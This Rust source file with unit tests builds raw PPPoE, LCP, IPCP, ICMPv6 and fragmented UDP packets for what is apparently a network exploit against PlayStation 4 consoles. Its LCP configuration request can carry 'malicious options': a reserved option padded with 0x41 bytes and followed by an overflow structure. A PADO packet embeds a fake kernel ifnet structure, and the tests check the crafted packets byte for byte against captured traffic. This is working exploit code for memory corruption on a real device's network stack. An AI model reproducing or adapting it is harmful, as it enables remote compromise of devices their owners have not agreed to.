// Import the constants module
use crate::constants;

use packet::ether;
use packet::Builder;
use pnet::packet::icmpv6::MutableIcmpv6Packet;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::{
    ethernet::{EtherTypes, MutableEthernetPacket},
    icmpv6::{Icmpv6Code, Icmpv6Types},
    ipv6::MutableIpv6Packet,
};

pub fn create_pado_packet(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    ac_cookie: Option<Vec<u8>>,
    host_uniq: [u8; 8],
) -> Vec<u8> {
    let mut payload = Vec::new();
    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(constants::PPPOE_CODE_PADO); // Code (PADO)
    payload.extend_from_slice(&0u16.to_be_bytes()); // Session ID (not used in PADO)

    // Placeholder for Payload Length (2 bytes), will be set later
    let payload_length_pos = payload.len();
    payload.extend_from_slice(&[0, 0]);

    if let Some(bytes) = ac_cookie {
        payload.extend_from_slice(&constants::PPPOE_TAG_ACOOKIE.to_be_bytes());
        payload.extend_from_slice(&(bytes.len() as u16).to_be_bytes());
        payload.extend_from_slice(&bytes);
    }
    // PPPoE Tag for HUNIQUE
    payload.extend_from_slice(&constants::PPPOE_TAG_HOST_UNIQ.to_be_bytes());
    payload.extend_from_slice(&(host_uniq.len() as u16).to_be_bytes());
    payload.extend_from_slice(&host_uniq);

    // Set the Payload Length
    let payload_length = payload.len() - payload_length_pos - 2;
    payload[payload_length_pos..payload_length_pos + 2]
        .copy_from_slice(&(payload_length as u16).to_be_bytes());

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeDiscovery)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_pads_packet(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_id: [u8; 2],
    host_uniq: [u8; 8],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(constants::PPPOE_CODE_PADS); // Code (PADS)
    payload.extend_from_slice(&session_id); // Session ID

    // We know fixed size of 12
    payload.extend_from_slice(&[0, 12]);

    // PPPoE Tag for HUNIQUE
    payload.extend_from_slice(&constants::PPPOE_TAG_HOST_UNIQ.to_be_bytes());
    payload.extend_from_slice(&(host_uniq.len() as u16).to_be_bytes());
    payload.extend_from_slice(&host_uniq);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeDiscovery)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_padt_packet(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_id: [u8; 2],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(constants::PPPOE_CODE_PADT); // Code (PADt)
    payload.extend_from_slice(&session_id); // Session ID

    // We know fixed size of 0
    payload.extend_from_slice(&[0, 0]);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeDiscovery)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_lcp_echo_reply(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_id: [u8; 2],
    identifier: u8,
    magic_number: [u8; 4],
) -> Vec<u8> {
    let mut packet = Vec::new();

    // Ethernet header
    packet.extend_from_slice(&target_mac);
    packet.extend_from_slice(&source_mac);
    packet.extend_from_slice(&constants::ETHERTYPE_PPPOESESS.to_be_bytes());

    // PPPoE header
    let version_type = 0x11; // Version 1, Type 1
    let code = 0x00; // PPPoE Session
    let session_id = u16::from_be_bytes(session_id);
    packet.push(version_type);
    packet.push(code);
    packet.extend_from_slice(&session_id.to_be_bytes());

    // Fixed PPP payload length (6 bytes)
    let fixed_payload_length = 10_u16.to_be_bytes();
    packet.extend_from_slice(&fixed_payload_length);

    // PPP header
    packet.extend_from_slice(&constants::ETHERTYPE_LCP.to_be_bytes());

    // LCP Echo Reply
    let lcp_code = 0x0A; // Echo Reply
    packet.push(lcp_code);
    packet.push(identifier);

    // LCP packet length field (4 bytes: code, identifier, length field itself)
    let lcp_length = 8_u16.to_be_bytes();
    packet.extend_from_slice(&lcp_length);

    // Magic Number
    packet.extend_from_slice(&magic_number);

    packet
}

pub fn create_lcp_conf_ack(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    identifier: u8,
) -> Vec<u8> {
    let mut payload = Vec::new();
    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 6]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_LCP.to_be_bytes());

    // LCP and fixed length
    payload.push(constants::LCP_CONF_ACK); // Configuration Ack
    payload.push(identifier);
    payload.extend_from_slice(&[0, 4]);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(constants::ETHERTYPE_PPPOESESS.into())
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_lcp_term_req(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    identifier: u8,
) -> Vec<u8> {
    let mut payload = Vec::new();
    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 6]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_LCP.to_be_bytes());

    // LCP and fixed length
    payload.push(constants::LCP_TERM_REQ); // Configuration Ack
    payload.push(identifier);
    payload.extend_from_slice(&[0, 4]);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(constants::ETHERTYPE_PPPOESESS.into())
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_lcp_conf_request(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    overflow_lle: Option<Vec<u8>>,
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    let length_index = payload.len(); // Store the index where the length will be inserted
    payload.extend_from_slice(&[0x00, 0x00]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_LCP.to_be_bytes());

    // LCP and fixed length
    payload.push(constants::LCP_CONF_REQ); // Configuration Request
    payload.push(constants::LCP_ID);

    if overflow_lle.is_some() {
        // Read https://datatracker.ietf.org/doc/html/rfc1661#section-6 and now I know
        payload.extend_from_slice(&[0x01, 0x04]); // 260 lcp size when adding the malicious options

        // Option
        payload.push(0x00); // The RESERVED type
        payload.push(0xfe); // The Length of the lcp options size 254
        for _ in 0..252 {
            payload.push(0x41);
        }
        // Push the length of the remaining stuff
        payload.extend_from_slice(&[0x00, 0x7A]); // 122
        payload.extend_from_slice(&overflow_lle.unwrap());
    } else {
        payload.extend_from_slice(&[0, 4]); // 4 lcp size whithout adding the malicious options
    }

    // Now, calculate the actual payload length
    let payload_length = (payload.len() - 6) as u16;

    // Update the length field in the PPPoE header (stored at length_index)
    let length_bytes = payload_length.to_be_bytes();
    payload[length_index] = length_bytes[0];
    payload[length_index + 1] = length_bytes[1];

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(constants::ETHERTYPE_PPPOESESS.into())
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_ipcp_conf_ack(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    ipcp_identifier: u8,
    ip_address: [u8; 4],
    dns: [u8; 4],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 24]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_IPCP.to_be_bytes());

    // IPCP and fixed length
    payload.push(constants::IPCP_CONF_ACK); // Configuration ACK
    payload.push(ipcp_identifier); //Identifier used to match req and rep
    payload.extend_from_slice(&[0, 22]);

    // IP
    payload.push(constants::IP_ADDRESS_TYPE); // Configuration Request
                                              // Fixed length
    payload.push(0x6);
    payload.extend_from_slice(&ip_address);

    //DNS1
    payload.push(0x81);
    payload.push(0x6);
    payload.extend_from_slice(&dns);

    //DNS2
    payload.push(0x83);
    payload.push(0x6);
    payload.extend_from_slice(&dns);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeSession)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_ipcp_conf_nak(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    ipcp_identifier: u8,
    ip_address: [u8; 4],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 12]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_IPCP.to_be_bytes());

    // IPCP and fixed length
    payload.push(constants::IPCP_CONF_NAK); // Configuration NAK
    payload.push(ipcp_identifier);
    payload.extend_from_slice(&[0, 10]);

    // IP
    payload.push(constants::IP_ADDRESS_TYPE); // Configuration Request
                                              // Fixed length
    payload.push(0x6);
    payload.extend_from_slice(&ip_address);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeSession)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_ipcp_conf_request(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    ipcp_identifier: u8,
    ip_address: [u8; 4],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 12]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_IPCP.to_be_bytes());

    // IPCP and fixed length
    payload.push(constants::IPCP_CONF_REQ); // Configuration Request
    payload.push(ipcp_identifier);
    payload.extend_from_slice(&[0, 10]);

    // IP
    payload.push(constants::IP_ADDRESS_TYPE); // Configuration Request
                                              // Fixed length
    payload.push(0x6);
    payload.extend_from_slice(&ip_address);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeSession)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_icmpv6_adv(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    source_v6: [u8; 16],
    target_v6: [u8; 16],
) -> Vec<u8> {
    let mut packet = vec![0u8; 14 + 40 + 8 + 16 + 8]; // Ethernet + IPv6 + ICMPv6 + Target Address + Options

    // Ethernet frame
    {
        let mut eth_packet = MutableEthernetPacket::new(&mut packet[..14]).unwrap();
        eth_packet.set_source(source_mac.into());
        eth_packet.set_destination(target_mac.into());
        eth_packet.set_ethertype(EtherTypes::Ipv6);
    }

    // IPv6 packet
    {
        let mut ipv6_packet = MutableIpv6Packet::new(&mut packet[14..54]).unwrap();
        ipv6_packet.set_version(6);
        ipv6_packet.set_traffic_class(0);
        ipv6_packet.set_flow_label(0);
        ipv6_packet.set_payload_length(32);
        ipv6_packet.set_next_header(IpNextHeaderProtocols::Icmpv6);
        ipv6_packet.set_hop_limit(0xff);
        ipv6_packet.set_source(source_v6.into());
        ipv6_packet.set_destination(target_v6.into());
    }

    // ICMPv6 Neighbor Advertisement
    {
        let mut icmpv6_packet = MutableIcmpv6Packet::new(&mut packet[54..(54 + 8)]).unwrap();
        icmpv6_packet.set_icmpv6_type(Icmpv6Types::NeighborAdvert);
        icmpv6_packet.set_icmpv6_code(Icmpv6Code(0));

        // Hardcoded flags
        let flags_offset = 4; // First 4 bytes are for type, code, checksum
        packet[54 + flags_offset] = 0xe0;
    }

    // Set the target address (16 bytes IPv6) after the ICMPv6 header
    packet[62..(62 + 16)].copy_from_slice(&source_v6);

    // ICMPv6 Option: Source Link-Layer Address (8 bytes)
    let options_offset: usize = 62 + 16;
    packet[options_offset] = 2; // Type: Source Link-Layer Address
    packet[options_offset + 1] = 1; // Length: 1 (in 8-byte blocks)
    packet[options_offset + 2..(options_offset + 8)].copy_from_slice(&source_mac);

    // Calculate ICMPv6 checksum
    {
        let mut icmpv6_packet = MutableIcmpv6Packet::new(&mut packet[54..]).unwrap();
        let checksum = pnet::packet::icmpv6::checksum(
            &icmpv6_packet.to_immutable(),
            &source_v6.into(),
            &target_v6.into(),
        );
        icmpv6_packet.set_checksum(checksum);
    }

    packet
}

pub fn create_icmpv6_echo_req(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    source_v6: [u8; 16],
    target_v6: [u8; 16],
) -> Vec<u8> {
    let mut packet = vec![0u8; 14 + 40 + 8]; // Ethernet + IPv6 + ICMPv6 Echo Request

    // Ethernet frame
    let mut eth_packet = MutableEthernetPacket::new(&mut packet[..14]).unwrap();
    eth_packet.set_source(source_mac.into());
    eth_packet.set_destination(target_mac.into());
    eth_packet.set_ethertype(EtherTypes::Ipv6);

    // IPv6 packet
    let mut ipv6_packet = MutableIpv6Packet::new(&mut packet[14..54]).unwrap();
    ipv6_packet.set_version(6);
    ipv6_packet.set_traffic_class(0);
    ipv6_packet.set_flow_label(0);
    ipv6_packet.set_payload_length(8);
    ipv6_packet.set_next_header(IpNextHeaderProtocols::Icmpv6);
    ipv6_packet.set_hop_limit(64);
    ipv6_packet.set_source(source_v6.into());
    ipv6_packet.set_destination(target_v6.into());

    // ICMPv6 Echo Request
    let mut icmpv6_packet = MutableIcmpv6Packet::new(&mut packet[54..]).unwrap();
    icmpv6_packet.set_icmpv6_type(Icmpv6Types::EchoRequest);
    icmpv6_packet.set_icmpv6_code(Icmpv6Code(0));

    // Calculate ICMPv6 checksum
    let checksum = pnet::packet::icmpv6::checksum(
        &icmpv6_packet.to_immutable(),
        &source_v6.into(),
        &target_v6.into(),
    );
    icmpv6_packet.set_checksum(checksum);

    packet
}

pub fn create_udp_packet(
    source_ipv4: [u8; 4],
    target_ipv4: [u8; 4],
    data: Vec<u8>,
    fragment_off: usize,
) -> Vec<u8> {
    let mut packet = Vec::new();
    // IPv4 header
    packet.push(0x08); // IPV4
    packet.push(0x00);

    packet.push(0x45); // v4 and size TODO
    packet.push(0x00); // differentieted service field

    // Placeholder for Payload Length (2 bytes), will be set later
    let packet_lenght_pos = packet.len();
    packet.extend_from_slice(&[0, 0]);

    packet.extend_from_slice(&[0x00, 0x01]); //TODO identification

    // Fragment offset and flag
    let value: u16 = 0x2000 + fragment_off as u16; // There are more packets
    packet.extend_from_slice(&value.to_be_bytes()); // Fragment offset

    packet.push(0x40); // TTL
    packet.push(0x11); // udp

    packet.extend_from_slice(&[0xb0, 0x32]); // cheksum header TODO

    packet.extend_from_slice(&source_ipv4);
    packet.extend_from_slice(&target_ipv4);

    //Data
    packet.extend_from_slice(&data);

    // Set the Payload Length
    let packet_length = packet.len() - packet_lenght_pos + 2;
    packet[packet_lenght_pos..packet_lenght_pos + 2]
        .copy_from_slice(&(packet_length as u16).to_be_bytes());

    packet
}

#[cfg(test)]
mod tests {

    use super::*;
    use pcap::Capture;

    fn get_test_ps4_mac() -> [u8; 6] {
        [0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]
    }

    fn get_test_host_mac() -> [u8; 6] {
        [0x07, 0x2c, 0xf6, 0x06, 0xba, 0x9b]
    }

    fn get_test_host_unique() -> [u8; 8] {
        [0x00, 0x2c, 0xf6, 0x06, 0xba, 0x9b, 0xff, 0xff]
    }

    use crate::exploit::network_structs::{build_fake_ifnet, build_overflow_lle};
    use std::fs::File;
    use std::io::Read;
    use std::io::Write;

    fn compare_packets(packet_type: &str, expected: &[u8], generated: &[u8]) {
        let generated_filename = format!("test_data/generated_{}.bin", packet_type);
        let expected_filename = format!("test_data/expected_{}.bin", packet_type);

        // Write the generated packet to a binary file
        let mut generated_file = File::create(&generated_filename)
            .expect("Failed to create binary file for generated packet");
        generated_file
            .write_all(generated)
            .expect("Failed to write generated packet to binary file");

        // Write the expected packet to a binary file
        let mut expected_file = File::create(&expected_filename)
            .expect("Failed to create binary file for expected packet");
        expected_file
            .write_all(expected)
            .expect("Failed to write expected packet to binary file");

        // Compare the lengths of the expected and generated packets
        assert_eq!(
            expected.len(),
            generated.len(),
            "Packet lengths are not equal for {}",
            packet_type
        );

        // Compare the contents of the expected and generated packets byte by byte
        for (idx, (expected_byte, generated_byte)) in
            expected.iter().zip(generated.iter()).enumerate()
        {
            assert_eq!(
                expected_byte, generated_byte,
                "Byte mismatch at index {} for {}: expected {:02x}, got {:02x}",
                idx, packet_type, expected_byte, generated_byte
            );
        }

        // Delete the temporary files
        remove_file(&generated_filename).expect("Failed to delete generated packet file");
        remove_file(&expected_filename).expect("Failed to delete expected packet file");
    }

    #[test]
    fn test_create_pado_packet() {
        // Open the pcap file containing the expected PADO packet
        let mut cap =
            Capture::from_file("test_data/pado_to_ps4.pcap").expect("Failed to open pcap file");

        // Extract the PADO packet from the file
        let expected_packet = cap.next_packet().expect("Failed to read PADO packet");

        // Define the input parameters for creating the PADO packet
        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let ifnet = build_fake_ifnet(0xffff9bba06f62c00);
        let ac_cookie = ifnet;
        let host_uniq = get_test_host_unique();

        // Create the PADO packet using the provided function
        let generated_pado_packet =
            create_pado_packet(source_mac, target_mac, Some(ac_cookie), host_uniq);

        // Write the generated PADO packet to a binary file
        let mut generated_file =
            File::create("test_data/generated_pado.bin").expect("Failed to create binary file");
        generated_file
            .write_all(&generated_pado_packet)
            .expect("Failed to write packet to binary file");

        // Write the expected PADO packet to a binary file
        let mut expected_file =
            File::create("test_data/expected_pado.bin").expect("Failed to create binary file");
        expected_file
            .write_all(&expected_packet.data)
            .expect("Failed to write packet to binary file");

        // Compare the lengths of the expected and generated packets
        assert_eq!(
            expected_packet.data.len(),
            generated_pado_packet.len(),
            "Packet lengths are not equal"
        );

        // Compare the contents of the expected and generated packets byte by byte
        for (idx, (expected_byte, generated_byte)) in expected_packet
            .data
            .iter()
            .zip(generated_pado_packet.iter())
            .enumerate()
        {
            assert_eq!(
                expected_byte, generated_byte,
                "Byte mismatch at index {}: expected {:02x}, got {:02x}",
                idx, expected_byte, generated_byte
            );
        }
    }

    #[test]
    fn test_create_ipcp_conf_ack() {
        let mut cap =
            Capture::from_file("test_data/ipcp_conf_ack.pcap").expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read IPCP CONF ACK packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let session_data = 0x00;
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes();
        let ip_address = [42, 42, 42, 42];
        let dns = constants::FAKE_PRIMARY_DNS_SERVER;

        let generated_packet = create_ipcp_conf_ack(
            source_mac,
            target_mac,
            session_data,
            session_id,
            3, // the test data has 3 for ipcp req
            ip_address,
            dns,
        );

        compare_packets("ipcp_conf_ack", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_ipcp_conf_nak() {
        let mut cap =
            Capture::from_file("test_data/ipcp_conf_nak.pcap").expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read IPCP CONF NAK packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let session_data = 0x00;
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes();
        let ip_address = [42, 42, 42, 42];

        let generated_packet = create_ipcp_conf_nak(
            source_mac,
            target_mac,
            session_data,
            session_id,
            2, // test uses 2
            ip_address,
        );

        compare_packets("ipcp_conf_nak", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_ipcp_conf_request() {
        let mut cap = Capture::from_file("test_data/ipcp_conf_request.pcap")
            .expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read IPCP CONF REQUEST packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let session_data = 0x00;
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes();
        let ip_address = constants::SOURCE_IPV4;

        let generated_packet = create_ipcp_conf_request(
            source_mac,
            target_mac,
            session_data,
            session_id,
            0x41, //test uses 0x41
            ip_address,
        );

        compare_packets(
            "ipcp_conf_request",
            &expected_packet.data,
            &generated_packet,
        );
    }

    #[test]
    fn test_create_pads_packet() {
        let mut cap =
            Capture::from_file("test_data/pads_packet.pcap").expect("Failed to open pcap file");
        let expected_packet = cap.next_packet().expect("Failed to read PADS packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes();
        let host_uniq = get_test_host_unique();

        let generated_packet = create_pads_packet(source_mac, target_mac, session_id, host_uniq);

        compare_packets("pads_packet", &expected_packet.data, &generated_packet);
    }
    use std::fs::remove_file;

    #[test]
    fn test_create_icmpv6_adv() {
        let mut cap =
            Capture::from_file("test_data/icmpv6_adv.pcap").expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read ICMPv6 Advertisement packet");

        let source_mac: [u8; 6] = get_test_host_mac();
        let target_mac: [u8; 6] = get_test_ps4_mac();
        let source_v6: [u8; 16] = [
            0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
        ];
        let target_v6: [u8; 16] = [
            0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0xca, 0x63, 0xf1, 0xff, 0xfe, 0x44, 0x45, 0x97,
        ];

        let generated_packet = create_icmpv6_adv(source_mac, target_mac, source_v6, target_v6);

        compare_packets("icmpv6_adv", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_icmpv6_echo_req() {
        let mut cap =
            Capture::from_file("test_data/icmpv6_echo_req.pcap").expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read ICMPv6 Echo Request packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let source_v6: [u8; 16] = [
            0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
        ];
        let target_v6: [u8; 16] = [
            0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0xca, 0x63, 0xf1, 0xff, 0xfe, 0x44, 0x45, 0x97,
        ];

        let generated_packet = create_icmpv6_echo_req(source_mac, target_mac, source_v6, target_v6);

        compare_packets("icmpv6_echo_req", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_lcp_conf_request_normal() {
        // Load the expected packet from a .pcap file for comparison
        let mut cap = Capture::from_file("test_data/lcp_conf_request.pcap")
            .expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read LCP CONF REQUEST packet");

        // Define the test input data
        let source_mac = get_test_host_mac(); // Function that retrieves a test MAC for the source
        let target_mac = get_test_ps4_mac(); // Function that retrieves a test MAC for the target
        let session_data = 0x00; // Example session data byte
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes(); // Example session ID (2 bytes)

        // Call the function to generate the LCP CONF REQUEST packet
        let generated_packet =
            create_lcp_conf_request(source_mac, target_mac, session_data, session_id, None);

        // Compare the expected packet with the generated packet
        compare_packets("lcp_conf_request", &expected_packet.data, &generated_packet);
    }

    // #[test]
    // fn test_create_lcp_term_req() {
    //     // Load the expected packet from a .pcap file for comparison
    //     let mut cap = Capture::from_file("test_data/lcp_term_request.pcap")
    //         .expect("Failed to open pcap file");
    //     let expected_packet = cap
    //         .next_packet()
    //         .expect("Failed to read LCP CONF REQUEST packet");

    //     // Define the test input data
    //     let source_mac = get_test_host_mac(); // Function that retrieves a test MAC for the source
    //     let target_mac = get_test_ps4_mac(); // Function that retrieves a test MAC for the target
    //     let session_data = 0x00; // Example session data byte
    //     let session_id = constants::PPPOE_SESSION_ID.to_be_bytes(); // Example session ID (2 bytes)

    //     // Call the function to generate the LCP CONF REQUEST packet
    //     let generated_packet = create_lcp_term_req(
    //         source_mac,
    //         target_mac,
    //         session_data,
    //         session_id,
    //         constants::LCP_ID,
    //     );

    //     // Compare the expected packet with the generated packet
    //     compare_packets("lcp_term_request", &expected_packet.data, &generated_packet);
    // }

    #[test]
    fn test_create_udp_first() {
        // Load the expected packet from a .pcap file for comparison
        let mut cap =
            Capture::from_file("test_data/first_udp.pcap").expect("Failed to open pcap file");
        let expected_packet = cap.next_packet().expect("Failed to read first udp packet");

        // Call the function to generate the  packet
        let generated_packet = create_udp_packet(
            constants::SOURCE_IPV4,
            constants::TARGET_IPV4,
            vec![0x41; 1024],
            0,
        );

        let mut full_packet = Vec::new();

        // PPPoE header
        full_packet.extend_from_slice(&[0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]);
        full_packet.extend_from_slice(&[0x41, 0x41, 0x41, 0x41, 0x41, 0x41]);
        full_packet.extend_from_slice(&generated_packet);

        // // Remove last 1024 bytes from expected and generated packets before comparison
        // let expected_packet_no_data = &expected_packet.data[expected_packet.data.len() - 1024..];
        // let generated_packet_no_data = &full_packet[full_packet.len() - 1024..];
        // Compare the expected packet with the generated packet
        compare_packets(
            "first_udp_slice",
            &expected_packet.data[0..34],
            &full_packet[0..34],
        );
    }

    #[test]
    fn test_create_lcp_conf_request_malicious() {
        // Load the expected packet from a .pcap file for comparison
        let mut cap = Capture::from_file("test_data/lcp_conf_request_m.pcap")
            .expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read LCP CONF REQUEST packet");

        // Define the test input data
        let source_mac = get_test_host_mac(); // Function that retrieves a test MAC for the source
        let target_mac = get_test_ps4_mac(); // Function that retrieves a test MAC for the target
        let session_data = 0x00; // Example session data byte
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes(); // Example session ID (2 bytes)

        // Create an overflow LLE for testing
        let test_host_unique = get_test_host_unique();
        let pppoe_softc: u64 = u64::from_le_bytes(test_host_unique);
        let overflow_lle = build_overflow_lle(pppoe_softc);

        // Call the function to generate the LCP CONF REQUEST packet
        let generated_packet = create_lcp_conf_request(
            source_mac,
            target_mac,
            session_data,
            session_id,
            Some(overflow_lle),
        );

        // Compare the expected packet with the generated packet
        compare_packets(
            "lcp_conf_request_m",
            &expected_packet.data,
            &generated_packet,
        );
    }
}
